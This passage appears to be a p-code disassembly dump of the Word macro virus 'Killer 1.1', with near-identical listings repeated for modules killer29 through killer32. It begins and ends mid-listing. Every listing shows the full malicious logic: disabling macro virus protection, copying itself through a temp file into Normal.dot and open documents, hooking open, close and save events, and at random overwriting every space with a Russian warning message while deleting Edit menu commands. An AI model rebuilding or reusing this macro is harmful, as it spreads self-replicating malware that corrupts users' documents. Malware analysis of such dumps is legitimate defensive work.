' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer29 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer30 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer31 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer32 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
